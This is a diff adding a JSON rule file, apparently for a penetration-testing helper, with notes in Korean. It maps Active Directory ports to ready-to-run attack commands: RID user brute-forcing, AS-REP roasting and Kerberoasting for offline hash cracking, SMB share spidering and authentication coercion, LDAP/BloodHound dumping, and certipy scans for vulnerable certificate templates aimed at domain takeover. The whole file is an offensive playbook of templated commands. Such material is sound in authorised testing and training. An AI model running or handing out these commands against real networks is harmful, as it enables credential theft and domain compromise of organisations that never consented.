@@ -1,0 +1,66 @@
+[
+  {
+    "name": "AD RID 브루트(널/게스트)",
+    "when": {"os": ["windows_ad"], "ports": [445]},
+    "suggest": [
+      "netexec smb {t} -u guest -p '' --rid-brute",
+      "netexec smb {t} -u '' -p '' --rid-brute"
+    ],
+    "note": "널/게스트 세션으로 도메인 사용자 목록 확보 → 유저리스트 작성.",
+    "tags": ["ad", "smb", "userenum"],
+    "phase": "enum"
+  },
+  {
+    "name": "AD AS-REP 로스팅",
+    "when": {"os": ["windows_ad"], "ports": [88]},
+    "suggest": [
+      "impacket-GetNPUsers {domain}/ -usersfile users.txt -no-pass -dc-ip {t} -format hashcat"
+    ],
+    "note": "프리인증 비활성 계정의 AS-REP 해시 획득 → hashcat -m 18200. users.txt 는 RID브루트 결과.",
+    "tags": ["ad", "kerberos", "asrep"],
+    "phase": "access"
+  },
+  {
+    "name": "AD Kerberoasting",
+    "when": {"os": ["windows_ad"], "ports": [88]},
+    "suggest": [
+      "impacket-GetUserSPNs {domain}/{user}:{pass} -dc-ip {t} -request -outputfile spn.hashes"
+    ],
+    "note": "SPN 계정 TGS 해시 → hashcat -m 13100. 도메인 자격증명 필요(수동).",
+    "tags": ["ad", "kerberos", "kerberoast"],
+    "phase": "access"
+  },
+  {
+    "name": "AD SMB 공유/스풀러",
+    "when": {"os": ["windows_ad"], "ports": [445]},
+    "suggest": [
+      "netexec smb {t} -u {user} -p {pass} --shares",
+      "netexec smb {t} -u {user} -p {pass} -M spider_plus",
+      "netexec smb {t} -u {user} -p {pass} -M coerce_plus"
+    ],
+    "note": "읽기가능 공유 내 자격증명/스크립트 수집. 자격증명 필요(수동).",
+    "tags": ["ad", "smb"],
+    "phase": "access"
+  },
+  {
+    "name": "AD LDAP 덤프",
+    "when": {"os": ["windows_ad"], "ports": [389]},
+    "suggest": [
+      "ldapdomaindump -u {domain}\\{user} -p {pass} ldap://{t} -o ldapdump",
+      "netexec ldap {t} -u {user} -p {pass} --bloodhound -c all --dns-server {t}"
+    ],
+    "note": "도메인 객체/권한 그래프. BloodHound 수집으로 공격경로 분석. 자격증명 필요.",
+    "tags": ["ad", "ldap", "bloodhound"],
+    "phase": "access"
+  },
+  {
+    "name": "ADCS 취약 템플릿(certipy)",
+    "when": {"os": ["windows_ad"], "ports": [445, 389]},
+    "suggest": [
+      "certipy find -u {user}@{domain} -p {pass} -dc-ip {t} -vulnerable -stdout"
+    ],
+    "note": "ESC1~ESC8 취약 인증서 템플릿 → 권한상승/도메인장악. 자격증명 필요.",
+    "tags": ["ad", "adcs", "certipy"],
+    "phase": "privesc"
+  }
+]
